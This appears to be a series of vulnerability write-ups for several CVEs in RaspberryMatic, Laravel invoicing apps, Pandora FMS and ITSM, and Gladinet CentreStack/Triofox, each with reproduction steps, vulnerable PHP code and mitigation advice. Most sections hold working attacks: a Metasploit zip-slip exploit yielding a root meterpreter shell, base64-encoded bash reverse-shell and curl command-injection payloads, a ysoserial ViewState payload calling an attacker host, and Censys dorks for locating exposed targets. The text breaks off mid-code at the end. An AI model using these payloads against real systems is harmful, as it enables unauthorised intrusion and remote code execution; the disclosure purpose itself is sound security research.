You can easily test this vulnerability by downloading a vulnerable OVA image from [here](https://github.com/jens-maus/RaspberryMatic/releases/tag/3.73.9.20240130) and install it in VirtualBox or VMware Fusion.

### Proof of Concept
1. Launch Metasploit
2. select  the zip slip module
3. set  TARGETPAYLOADPATH to `../../../../../../../../../..//usr/local/addons/mediola/bin/watchdog` to overwrite watchdog script with payload
4. run the module
5. compress the resulting tar file to .tgz format
6. lauch a Listener
7. upload the malicious `msf.tgz` file using `curl`
8. wait maximum five minutes for `cron` to kick-in and run the overwritten watchdog script
9. Bingo, a `meterpreter` session should pop-up…

```shell
msf6 > use exploit/multi/fileformat/zip_slip
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/fileformat/zip_slip) > options

Module options (exploit/multi/fileformat/zip_slip):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   FILENAME           msf.tar          yes       The name of the archive file
   FTYPE              tar              yes       The archive type (Accepted: tar, zip)
   TARGETPAYLOADPATH  ../payload.bin   yes       The targeted path for payload


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.201.8    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Manually determined


View the full module info with the info, or info -d command.
msf6 exploit(multi/fileformat/zip_slip) > set TARGETPAYLOADPATH ../../../../../../../../../..//usr/local/addons/mediola/bin/watchdog
TARGETPAYLOADPATH => ../../../../../../../../../..//usr/local/addons/mediola/bin/watchdog
msf6 exploit(multi/fileformat/zip_slip) > exploit
[+] msf.tar stored at /root/.msf4/local/msf.tar
[*] When extracted, the payload is expected to extract to:
[*] ../../../../../../../../../..//usr/local/addons/mediola/bin/watchdog
msf6 exploit(multi/fileformat/zip_slip) > gzip /root/.msf4/local/msf.tar
[*] exec: gzip /root/.msf4/local/msf.tar

msf6 exploit(multi/fileformat/zip_slip) > mv /root/.msf4/local/msf.tar.gz /root/.msf4/local/msf.tgz
[*] exec: mv /root/.msf4/local/msf.tar.gz /root/.msf4/local/msf.tgz

msf6 exploit(multi/fileformat/zip_slip) > use multi/handler
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:4444
msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                            Payload opts
  --  ----                    -------                            ------------
  0   Exploit: multi/handler  linux/x86/meterpreter/reverse_tcp  tcp://0.0.0.0:4444
```
Upload malicious compressed tar file.
``` shell
# curl --insecure -H "Content-type: multipart/form-data" -F filename=@/root/.msf4/local/msf.tgz https://192.168.201.6/pages/jpages/system/DeviceFirmware/addFirmware
${addDevFirmwareInfoCorrupt}
```
Wait five minutes…
```
msf6 exploit(multi/handler) >
[*] Sending stage (1017704 bytes) to 192.168.201.6
[*] Meterpreter session 1 opened (192.168.201.8:4444 -> 192.168.201.6:47982) at 2025-01-28 21:00:01 +0000

msf6 exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                   Information           Connection
  --  ----  ----                   -----------           ----------
  1         meterpreter x86/linux  root @ 192.168.201.6  192.168.201.8:4444 -> 192.168.201.6:47982 (192.168.201.6)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : 192.168.201.6
OS           :  (Linux 6.1.74)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: root
meterpreter > shell
Process 15622 created.
Channel 1 created.
uname -a
Linux homematic-raspi 6.1.74 #1 SMP PREEMPT Tue Jan 30 06:46:28 UTC 2024 x86_64 GNU/Linux
exit
meterpreter >
```

Pretty straightforward, but unfortunately the existing zip-slip module in Metasploit only supports a limited amount of payloads.
However, RaspberryMatic is supported on a range platforms like Raspberry Pi, ASUS Tinkerboard or ODROID which are all ARM based  single-board-computers.
Therefore I developed a separate [Metasploit module: PR19841](https://github.com/rapid7/metasploit-framework/pull/19841) that covers most of the RaspberryMatic supported architectures and fully automates the attack.

### Indicators of Compromise (IOCs)
Unfortunately there is not much to go on in the log files. The only IOC might be the overwritten watchdog script in `/usr/local/addons/mediola/bin` which contains a malicious payload. However, the Metasploit module will cover these tracks by restoring the original watchdog script after a successful attack .

### Mitigation
RaspberryMatic versions <= `3.73.9.20240130` are vulnerable. Please upgrade your RaspberryMatic installation to the latest version or at least to version `3.75.6.20240316` where this issue has been fixed.

### References
[CVE-2024-24578](https://www.cve.org/CVERecord?id=CVE-2024-24578) 
[GHSA-q967-q4j8-637h security disclosure](https://github.com/jens-maus/RaspberryMatic/security/advisories/GHSA-q967-q4j8-637h)
[Metasploit Module PR 19841: RaspberryMatic Unauthenticated RCE via Zip Slip](https://github.com/rapid7/metasploit-framework/pull/19841)

### Credits
[h0ng10](https://github.com/h0ng10) => discovery of the vulnerability
[jens-maus](https://github.com/jens-maus) => verifier and remediation

---

## CVE-2024-55556
*Posted 2025-03-05 · last revised 2025-03-08*

> A vulnerability in Crater Invoice allows an unauthenticated attacker with knowledge of the APP_KEY to achieve remote command execution on the server by manipulating the laravel_session cookie, exploiting arbitrary deserialization through the encrypted session data. The exploitation vector of this vulnerability relies on an attacker obtaining Laravel's secret APP_KEY, which would allow them to decrypt and manipulate session cookies (laravel_session) containing serialized data. By altering this data and re-encrypting it with the APP_KEY, the attacker could trigger arbitrary deserialization on the server, potentially leading to remote command execution (RCE). The vulnerability is primarily exploited by accessing an exposed cookie and manipulating it using the secret key to gain malicious access to the server.

This vulnerability has a similar attack surface as the one described in [CVE-2024-55555](https://nvd.nist.gov/vuln/detail/cve-2024-55555) where Laravel based applications can be exploited due to bad decryption implementations.  In this case, an attacker in possession of the secret Laravel `APP_KEY` would therefore be able to retrieve the Laravel cookie, uncipher it and modify the serialized data in order to get arbitrary deserialization on the affected server, allowing them to achieve remote command execution. The attack sequence is very well described in this [security advisory of Synacktiv](https://www.synacktiv.com/advisories/crater-invoice-unauthenticated-remote-command-execution-when-appkey-known).
InvoiceShelf  is an example of a Laravel PHP based application where this  vulnerability can be abused. InvoiceShelf version `1.3.0` and lower, which is a fork of Crater Invoice, is vulnerable. 

As discussed in my other [attackerkb article](https://attackerkb.com/topics/QtMS7cIExH/cve-2024-55555), you can use the `LaravelCrytpoKiller mixin` to exploit this type of vulnerabilities using Metasploit. Therefore I created a Metasploit module targeting vulnerable InvoiceShelf applications to automate and demonstrate this attack.
You can find the module in this PR submission [InvoiceShelf unauthenticated PHP deserialization vulnerability](https://github.com/rapid7/metasploit-framework/pull/19950).

### References
[CVE-2024-55556](https://nvd.nist.gov/vuln/detail/cve-2024-55556)
[Laravel HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/laravel.html)
[InvoiceShelf security disclosure from Synacktiv](https://www.synacktiv.com/advisories/crater-invoice-unauthenticated-remote-command-execution-when-appkey-known)
[Metasploit InvoiceShelf unauthenticated PHP deserialization vulnerability](https://github.com/rapid7/metasploit-framework/pull/19950)
[InvoiceShelf Github](https://github.com/InvoiceShelf/InvoiceShelf)

### Credits
`Rémi Matasse` and `Mickaël Benassouli` from Synacktiv

---

## CVE-2024-55555
*Posted 2025-03-07 · last revised 2025-03-08*

> Invoice Ninja before 5.10.43 allows remote code execution from a pre-authenticated route when an attacker knows the APP_KEY. This is exacerbated by .env files, available from the product's repository, that have default APP_KEY values. The route/{hash} route defined in the invoiceninja/routes/client.php file can be accessed without authentication. The parameter {hash} is passed to the function decrypt that expects a Laravel ciphered value containing a serialized object. (Furthermore, Laravel contains several gadget chains usable to trigger remote command execution from arbitrary deserialization.) Therefore, an attacker in possession of the APP_KEY is able to fully control a string passed to an unserialize function.

Laravel PHP applications can be exploited due to bad implementations of decryption mechanisms. Synacktiv published this [advisory](https://www.synacktiv.com/advisories/invoiceninja-unauthenticated-remote-command-execution-when-appkey-known) where you can pull off arbitrary unserialization via decrypt in the application Invoice Ninja. I am not gonna dwell on the actual attack scenario because this is pretty good described in the [Synacktiv advisory](https://www.synacktiv.com/advisories/invoiceninja-unauthenticated-remote-command-execution-when-appkey-known).

More interesting is the use of the [Laravel Crypto Killer tool](https://github.com/synacktiv/laravel-crypto-killer) that was designed by Synacktiv team to support this type of attacks.
Having this toolkit available in Metasploit that can be leveraged in the different exploits that are subject to these bad implementations of decryption mechanisms in Laravel PHP applications would be a welcome addition. 

Therefore I created the `LaravelCryptoKiller mixin` in combination with the Invoice Ninja exploit that automates these attacks.
You can find them both in this PR submission [Invoice Ninja unauthenticated RCE [CVE-2024-55555] + Laravel Crypto Killer mixin #19897](https://github.com/rapid7/metasploit-framework/pull/19897).

### References
[CVE-2024-55555](https://nvd.nist.gov/vuln/detail/cve-2024-55555)
[Laravel HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/laravel.html)
[Invoice Ninja security disclosure from Synacktiv](https://www.synacktiv.com/advisories/invoiceninja-unauthenticated-remote-command-execution-when-appkey-known)
[Invoice Ninja unauthenticated RCE [CVE-2024-55555] + Laravel Crypto Killer mixin #19897](https://github.com/rapid7/metasploit-framework/pull/19897)

### Credits
`Rémi Matasse` and `Mickaël Benassouli` from Synacktiv



---

## CVE-2024-12992
*Posted 2025-03-18 · last revised 2025-08-13*

> Improper Neutralization of Special Elements used in a Command vulnerability allows OS Command Injection via RCE.   This issue affects Pandora FMS from 700 to 777.6  .

 I found a RCE in the goTTY QuickShell implementation that was, according the documentation, introduced in Pandora FMS version 774.
The `gotty_port` variable is not properly escaped and can be controlled by the attacker to perform an RCE. The attack can easily be executed as long as you have admin access to the Pandora FMS application.

Here are the steps to reproduce:
1. login as admin at Pandora FMS
2. Goto the Management->Settings->System Settings->QuickShell
3. Update the Port settings with one of the payloads below
4. Click the update button and let the magic happen

![Pandora Quickshell rce](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2024-12992/cve-2024-12992-quickshell.png).

The following payloads work but there should be no spaces in payload, so we use base64 encoding and the IFS delimiter to avoid using spaces.
Please change the IP addresses to your test range.

**Bash reverse shell:**
```
bash -i >& /dev/tcp/192.168.201.8/4444 0>&1
echo -n "bash -i >& /dev/tcp/192.168.201.8/4444 0>&1"|base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==
```
***payload***
`;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==|base64${IFS}-d|bash;`
On attacker system run : `nc -lvnp 4444`

**Tiny shell:**
```
(sh)0>/dev/tcp/192.168.201.8/4444
echo -n "(sh)0>/dev/tcp/192.168.201.8/4444"|base64 -w0
KHNoKTA+L2Rldi90Y3AvMTkyLjE2OC4yMDEuOC80NDQ0
```
***payload***
`;echo${IFS}KHNoKTA+L2Rldi90Y3AvMTkyLjE2OC4yMDEuOC80NDQ0|base64${IFS}-d|bash;`
After getting shell, type command below to get the output when executing the commands
`exec >&0`
On attacker system run : `nc -lvnp 4444`

**Simple curl test:**
You can also do a simple test with a curl based payload.
***payload***
`;curl${IFS}192.168.201.8;`
On attacker system run: `python3 -m http.server 80`

I have tested this on the following releases and all are vulnerable:
* PFMS Enterprise version 780 on Rocky Linux 9.5
* PFMS Enterprise version 777.6 on Ubuntu 22.04
* PFMS Community version 777-LTS running Ubuntu 22.04

The vulnerable PHP code is listed in the file `/var/www/html/pandora_console/include/functions_cron_task.php`.
The function `cron_task_start_gotty(bool $restart_mode=true)` has a vulnerable code where the port setting of `pando_gotty` is not properly escaped before it gets processed by the `shell_exec()` function.
```php
// begin vulnerable code section
if ($start_proc === true && file_exists('/usr/bin/pandora_gotty') === true) {
        $logFilePath = $config['homedir'].'/log/gotty_cron_tmp.log';
        shell_exec('touch '.$logFilePath);

        // Start gotty process and capture the output.
        $command = '/usr/bin/nohup /usr/bin/pandora_gotty --config /etc/pandora_gotty/pandora_gotty.conf -p '.$config['gotty_port'].' /usr/bin/pandora_gotty_exec > '.$logFilePath.' 2>&1 &';
        shell_exec($command);
// end vulnerable code section
```
### Mitigation
Please upgrade to the latest release of Pandora FMS.

### References
[CVE-2024-12992](https://www.cve.org/CVERecord?id=CVE-2024-12992)
[Pandora FMS](https://pandorafms.com/en/)
[Pandora FMS Downloads](https://sourceforge.net/projects/pandora/files/)

### Credits
[h00die-gr3y](mailto:h00die.gr3y@gmail.com) -> Discovery

---

## CVE-2024-12971
*Posted 2025-03-18 · last revised 2025-08-13*

> Improper Neutralization of Special Elements used in a Command vulnerability allows OS Command Injection.This issue affects Pandora FMS from 700 to 777.6

This is a similar RCE like [CVE-2024-12992](https://attackerkb.com/topics/Aua29E9XcB/cve-2024-12992) but now in the `Chromium-path` and `Phantomjs-bin` directory settings at the Pandora FMS application.

At PFMS version 768 and higher the `chromium_path` variable is not properly escaped  and can be controlled by the attacker to perform an RCE.
At PFMS version 767 and earlier the same RCE is applicable for `phantomjs_bin` directory setting.

Vulnerable code section sits in the file  `/var/www/html/pandora_console/include/class/ConsoleSupervisor.php` in the public function `checkPHPSettings()`. 

 **PFMS version 768 and higher:**
```php
// Chromium status.
        $chromium_dir = io_safe_output($config['chromium_path']);
        $result_ejecution = exec($chromium_dir.' --version');
```
**PFMS version 767 and earlier:**
```php
        // PhantomJS status
        $phantomjs_dir = io_safe_output($config['phantomjs_bin']);
        $result_ejecution = exec($phantomjs_dir.'/phantomjs --version’);
```
The attack can easily be executed as long as you have admin access to the Pandora FMS.

Here are the steps to reproduce:
1. login as admin at Pandora FMS
2. Goto the Management->System Settings->General Setup
3. Update the Chromium path setting with one of the payloads below
4. Click the update button and the magic happens

![Pandora Quickshell rce](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2024-12971/cve-2024-12971-chromium-path-rce.png)
**Note:** For PFMS version 767 and earlier, it will be the `Phantomjs_bin` setting.

The following payloads work but there should be no spaces in payload, so we use base64 encoding and the IFS delimiter to avoid using spaces.
Please change the IP addresses to your test range.

**Bash reverse shell:**
```
bash -i >& /dev/tcp/192.168.201.8/4444 0>&1
echo -n "bash -i >& /dev/tcp/192.168.201.8/4444 0>&1"|base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==
```
***payload***
`;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==|base64${IFS}-d|bash;`
On attacker system run : `nc -lvnp 4444`

**Tiny shell:**
```
(sh)0>/dev/tcp/192.168.201.8/4444
echo -n "(sh)0>/dev/tcp/192.168.201.8/4444"|base64 -w0
KHNoKTA+L2Rldi90Y3AvMTkyLjE2OC4yMDEuOC80NDQ0
```
***payload***
`;echo${IFS}KHNoKTA+L2Rldi90Y3AvMTkyLjE2OC4yMDEuOC80NDQ0|base64${IFS}-d|bash;`
After getting shell, type command below to get the output when executing the commands
`exec >&0`
On attacker system run : `nc -lvnp 4444`

**Simple curl test:**
You can also do a simple test with a curl based payload.
***payload***
`;curl${IFS}192.168.201.8;`
On attacker system run: `python3 -m http.server 80`

I have tested this on the following releases and all are vulnerable:

**Chromium-path:**
* Pandora FMS Enterprise version 780 on Rocky Linux 9.5
* Pandora FMS Enterprise version 777.6 on Ubuntu 22.04
* Pandora FMS Community Edition v7.0NG.768 (CentOS 7 ISO image)
* Pandora FMS Community Edition v7.0NG.777-LTS (Ubuntu 22.04)
* Pandora FMS Community Edition v7.0NG.772-LTS (Ubuntu 22.04)

**Phantomjs-bin:**
* Pandora FMS Community Edition v7.0NG.724 (CentOS 7 ISO image)
* Pandora FMS Community Edition v7.0NG.725 (CentOS 7 ISO image)
* Pandora FMS Community Edition v7.0NG.738 (CentOS 7 ISO image)
* Pandora FMS Community Edition v7.0NG.739 (CentOS 7 ISO image)
* Pandora FMS Community Edition v7.0NG.759 (CentOS 7 ISO image)
* Pandora FMS Community Edition v7.0NG.767 (CentOS 7 ISO image)

I have submitted a Metasploit module [Pandora FMS authenticated RCE](https://github.com/rapid7/metasploit-framework/pull/20008) that automates this attack.

### Mitigation
Please upgrade to the latest release of Pandora FMS.

### References
[CVE-2024-12971](https://www.cve.org/CVERecord?id=CVE-2024-12971)
[Pandora FMS](https://pandorafms.com/en/)
[Pandora FMS Downloads](https://sourceforge.net/projects/pandora/files/)
[Metasploit PR 20008 - Pandora FMS authenticated RCE ](https://github.com/rapid7/metasploit-framework/pull/20008)

### Credits
[h00die-gr3y](mailto:h00die.gr3y@gmail.com) -> Discovery

---

## CVE-2025-32433
*Posted 2025-04-18 · last revised 2025-04-19*

> Erlang/OTP is a set of libraries for the Erlang programming language. Prior to versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20, a SSH server may allow an attacker to perform unauthenticated remote code execution (RCE). By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access to affected systems and execute arbitrary commands without valid credentials. This issue is patched in versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20. A temporary workaround involves disabling the SSH server or to prevent access via firewall rules.

To be published soon.

---

## CVE-2025-30406
*Posted 2025-05-02 · last revised 2025-05-04*

> Gladinet CentreStack through 16.1.10296.56315 (fixed in 16.4.10315.56368) has a deserialization vulnerability due to the CentreStack portal's hardcoded machineKey use, as exploited in the wild in March 2025. This enables threat actors (who know the machineKey) to serialize a payload for server-side deserialization to achieve remote code execution. NOTE: a CentreStack admin can manually delete the machineKey defined in portal\web.config.

Both Gladinet’s CentreStack and Triofox applications suffer from a __VIEWSTATE deserialization vulnerability which is a common attack pattern for Microsoft ASP.NET web applications. ASP.NET web applications use ViewState in order to maintain a page state and persist data in a web form. The ViewState parameter is a base64 serialized parameter that is normally sent via a hidden parameter called __VIEWSTATE with a POST request. This parameter is deserialized on the server-side to retrieve the data.

There is an amazing post from [Soroush](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/) that explains it very well (have a read first!).  He explains that knowledge of used validation and decryption keys and algorithms within the `machineKey` section of the configuration files (`web.config` or `machine.config`) is required to exploit a ViewState deserialization attack when the MAC validation feature is enabled. This is the default configuration for all .NET Framework versions since September 2014. 

This is applicable for vulnerable Gladinet’s CentreStack and Triofox applications, where the `machineKey` section is static and can be easily retrieved from the `web.config` files.
The vulnerable `web.config` files for Gladinet CentreStack and Triofox are typically located at:
* `C:\Program Files (x86)\Gladinet Cloud Enterprise\root\web.config`
* `C:\Program Files (x86)\Gladinet Cloud Enterprise\portal\web.config`
* `C:\Program Files (x86)\Triofox\root\web.config`
* `C:\Program Files (x86)\Triofox\portal\web.config`

Please search for this section in the `web.config` file:
`<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto | DES | 3DES | AES | alg:algorithm_name]" />`

Soroush created a `YSoSerial.Net` plugin to create ViewState payloads when the MAC validation is enabled and we know the secrets which is exactly the use case here.

## Demonstration
Time to see this attack in action!

### Step 1: Install a vulnerable instance of Gladinet CentreStack or Triofox
Gladinet CentreStack versions up to 16.4.10315.56368 are vulnerable (fixed in 16.4.10315.56368).
Gladinet Triofox versions up to 16.4.10317.56372 are vulnerable (fixed in 16.4.10317.56372).

* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download an evaluation Windows Server iso image (2016, 2019 or 2022) and install it as a VM on your virtualization engine. Google is your best friend on how to do this ;-)
* Download the [Gladinet CentreStack gui installer](https://www.centrestack.com/p/gce_latest_release.html) or...
* Download the [Gladinet Triofox gui installer](https://access.triofox.com/releases_history/). For Triofox, you will need a free trial account to reach the installer page.
* Run the gui installer on your Windows VM.
* Reboot your VM and you should be able to access the application via `https://your_ip/portal/loginpage.aspx`.

You are now ready to test vulnerability and execute the ViewState deserialization attack.

### Step 2: Install YSoSerial.NET
* Get latest version YSoSerial.NET from [here](https://github.com/pwntester/ysoserial.net/releases).
*  Download zip and unzip on your Windows target where you have installed your vulnerable Gladinet application.

### Step 3: Create the ViewState payload with YSoSerial.NET using the known secrets
* Get the validationKey value from the machineKey section at the `web.config` file.
* Create the ViewState payload using the following `ysoserial` command (validationkey is redacted):
```
PS C:\Users\Administrator\Downloads\ysoserial.net\ysoserial\bin> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties --generator="3FE2630A" --validationalg="HMACSHA256" --validationkey="REDACTED" -c "powershell.exe Invoke-WebRequest -Uri http://192.168.201.8:8000/$env:UserName"
%2FwEy2gcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAD8BTw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgcG93ZXJzaGVsbC5leGUgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vMTkyLjE2OC4yMDEuODo4MDAwL0FkbWluaXN0cmF0b3IiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M%2BDQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI%2BC%2FWr6klqzRlC7c24OEGRQWIardgUSFZzB9FMIQ%2BtaLhm
```
* The generator key can be retrieved from the web request below using `burpsuite`:
![__viewstategenerator key](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-30406/burpsuite__viewstategenerator.png)

### Step 4: Execute ViewState payload on the vulnerable page of the Gladinet CentreStack or Triofox application
* Launch a python web server listing on port 8000 on the attacker machine. Our payload will send a web request if the deserialization attack is successful on the target server.
```
# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Execute the POST request with `burpsuite` on the target machine (`https://<ip>/portal/loginpage.aspx`).
![__viewstate deserialization attack](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-30406/burpsuite__viewstate_deserialization.png)

* if successful, you should receive a HTTP 302 response and on the attacker machine you should see the web request with the `UserName` resolved.
```
# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.201.5 - - [03/May/2025 09:50:00] code 404, message File not found
192.168.201.5 - - [03/May/2025 09:50:00] "GET /Administrator HTTP/1.1" 404 -
```

The overall rating of this vulnerability is `9.0`, but frankly speaking it should be at least `9.8` looking at the ease of exploitation.
Both the vulnerable Gladinet CentreStack and Triofox application are shipped with the same static machineKey settings which makes attack surface even broader and easier to exploit.
Things get even worse, because it seems that there are a lot of rebranded versions on the Internet that are likely suffering from the same issue.

**Censys dorks:** 
* `services.http.response.body: "3FE2630A" and services.http.response.body: "__VIEWSTATEGENERATOR"`
* `services.software.uniform_resource_identifier: "cpe:2.3:a:gladinet:centrestack:*:*:*:*:*:*:*:*"`

There is a Metasploit module available that automates this attack (see [PR20096](https://github.com/rapid7/metasploit-framework/pull/20096)).

### Mitigation
Upgrade to the latest versions of CentreStack (16.4.10315.56368) and Triofox (16.4.10317.56372). If patching is not immediately possible, change the machineKey values in all [web.config files](https://support.triofox.com/hc/en-us/articles/4405656685335-Hardening-the-Triofox-Cluster#h_01JQXYCN9GWPB4EMDM5CEDDYS0).
Implement continuous monitoring for unusual activity, especially related to PowerShell execution and network connections to suspicious IPs. 
Look for ViewState errors in Windows ApplicationEvent Logs (Event ID 1316) and suspicious outbound connections from IIS Worker Processes.

### References
[CVE-2025-30406](https://www.cve.org/CVERecord?id=CVE-2025-30406)
[Soroush blog on ViewState deserialization](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
[Huntress Analysis](https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild)
[Wo1fh4cker POC](https://github.com/W01fh4cker/CVE-2025-30406)
[Metasploit Gladinet CentreStack/Triofox ASP.NET ViewState Deserialization [CVE-2025-30406]](https://github.com/rapid7/metasploit-framework/pull/20096)

### Credits
`Huntress team` Discovery
`Wo1fh4cker` POC





---

## CVE-2025-4653
*Posted 2025-06-18 · last revised 2025-07-24*

> Improper Neutralization of Special Elements in the backup name field may allow OS command injection. This issue affects Pandora ITSM 5.0.105.

I recently opened  another box of Pandora ;-) and found some vulnerabilities.
This time I assessed Pandora ITSM Enterprise Edition 5.0.105 Build 250129 MR98. You can get a free trial [here](https://pandorafms.com/en/itsm/free-trial/).

The vulnerability is a RCE where the backup name field is not properly escaped when making a backup.
The attack can easily be executed as long as you have admin access to Pandora ITSM.
 Here are the steps to reproduce:

1. Login as admin at Pandora ITSM
2. Goto the Setup->Backup
3. Update the Name field with one of the payloads below
4. Select Mode “Only Files”
5. Click the "Do a backup now" button and the magic happens

![backup_name_RCE](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-4653/backup_name_RCE.png)
The following payloads work but there should be no spaces > & ' " in the payload, so we use base64 encoding and the IFS delimiter to avoid using spaces.
Please change the IP addresses to your range.

Bash reverse shell:
```shell
bash -i >& /dev/tcp/192.168.201.8/4444 0>&1
echo -n "bash -i >& /dev/tcp/192.168.201.8/4444 0>&1"|base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==
```
payload:
`;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS44LzQ0NDQgMD4mMQ==|base64${IFS}-d|bash;`

On attacker system run : `nc -lvnp 4444`

You can also do a simple test with a curl based payload.
payload:
`;curl${IFS}192.168.201.8;`

On attacker system run: `python3 -m http.server 80`

![http_listener](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2025-4653/http_listener.png)

I have tested this on the following release: Pandora ITSM Enterprise Edition 5.0.105 Build 250129 MR98 on Ubuntu 22.04.

### Root Cause
The vulnerable PHP code is listed in the file `/var/www/html/pandoraitsm/enterprise/include/functions_backup.php`.
The function  `create_backup ($name, $mode, &$real_name, $from_programming = false)` has vulnerable code where the `$name` is not properly escaped before it gets processed into `$real_name` which is used in the construction of the backup filename for sql and attachment backup and is passed to the `exec()` function for execution.
```php
// begin vulnerable code section
function create_backup ($name, $mode, &$real_name, $from_programming = false) {
        global $config;

        $time = new DateTime('now');
        $time = $time->format("d-m-y-h-i-s");

        if ($real_name == "") {
                $name_without_blank = str_replace(" ", "_space_", safe_output($name));
                //$real_name = "IntegriaBackup---" . 0 . "---" . $mode . "---" . $name_without_blank . "---" . substr(MD5(rand(1000, 1000000000)), 10) . "---" . $time;
                $real_name = "IB---" . 0 . "---" . $mode . "---" . $name_without_blank. "---". $time;
        }

        $sqlfile = "";
        $attachmentsfile = "";
        switch ($mode) {
                case 0:
                        $sqlfile = "db_backup_" . $real_name . ".sql";
                        break;
                case 1:
                        $attachmentsfile = BACKUP_FULLPATH . '/' . "attachments_backup_" . $real_name . "/";
                        mkdir($attachmentsfile);
                        break;
                case 2:
                        $sqlfile = "db_backup_" . $real_name . ".sql";

                        $attachmentsfile = BACKUP_FULLPATH . '/' . "attachments_backup_" . $real_name . "/";
                        mkdir($attachmentsfile);
                        break;
        }

        $uname = php_uname();
        $so_win = preg_match("/(.)*Windows(.)*/i",$uname);

        if ($so_win) {
